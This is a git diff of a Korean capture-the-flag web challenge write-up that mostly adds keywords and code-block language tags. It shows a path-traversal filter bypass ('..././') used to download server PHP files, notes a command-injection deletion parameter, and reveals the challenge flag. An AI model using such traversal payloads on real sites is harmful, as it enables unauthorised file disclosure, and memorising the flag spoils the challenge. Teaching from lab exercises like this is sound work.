@@ -4,7 +4,11 @@
 > 핵 실험은 진행 중... :(  
 > (Core/Kernel/Nucleus/Hack)
 
-## Write-up
+## Keyword
+* File Download  
+* Command Injection
+
+## Solution
 ![Main](img/001.png)  
 메인 페이지에 접근해보면 핵폭발 후 생기는 버섯구름처럼 보이는 것을 볼 수 있습니다.  
 버섯구름 아래에 보면 초록색으로 되어있는 잡초를 볼 수 있고 눌러보면 php 파일이 다운로드 됩니다.
@@ -30,7 +34,7 @@
 /download.php?file=..././download
 
 download.php:  
-```
+```php
 <?php
     $file = isset($_GET['file']) ? $_GET['file'] : false;
     if($file) {
@@ -69,7 +73,7 @@ download.php:
 
 download.php 소스 코드를 보면 파일이 다운로드 되는 과정을 볼 수는 있지만 추가적인 정보를 얻기에는 부족합니다.  
 다시 처음으로 돌아가서 메인 페이지의 소스 코드를 보면 다음과 같은 코드를 볼 수 있습니다.  
-```
+```css
 .hint:sublime { text-decoration: none; }
 ```
 
@@ -78,7 +82,7 @@ download.php 소스 코드를 보면 파일이 다운로드 되는 과정을 볼
 /download.php?file=..././admin
 
 admin.php:  
-```
+```php
 <!DOCTYPE html>
 <html>
 <head>
@@ -119,7 +123,7 @@ admin.php 파일을 보면 config.php 파일을 확인할 수 있고 동일한 �
 /download.php?file=..././config
 
 config.php:  
-```
+```php
 <?php
     if($_COOKIE['admin'] != "true") exit("Access Denied!");
 ?>
@@ -129,7 +133,7 @@ config.php:
 ![AdminPage](img/003.png)
 
 그리고 admin.php 파일을 보면 다음과 같이 GET 파라미터로 값을 전달 받아서 파일을 삭제하는 부분을 볼 수 있으나, 아직 개발이 완료되지 않아서 전체 삭제가 되지 않도록 *(asterisk) 기호는 필터링되어 있고 글자 길이도 3 글자가 넘을 경우 실행되지 않도록 처리되어 있는 것을 볼 수 있습니다.  
-```
+```php
     $del = isset($_GET['del']) ? $_GET['del'] : false;
     if($del) {
         if(@preg_match("/\*/i", $_GET['del'])) exit("Access Denied!");
@@ -151,7 +155,7 @@ config.php:
 /download.php?file=..././7h1s_is_f1a9
 
 7h1s_is_f1a9.php:  
-```
+```php
 <?php
     print("Access Denied!");
     # Flag is TDCTF{C0R3_H4CK_NUCL3U5}
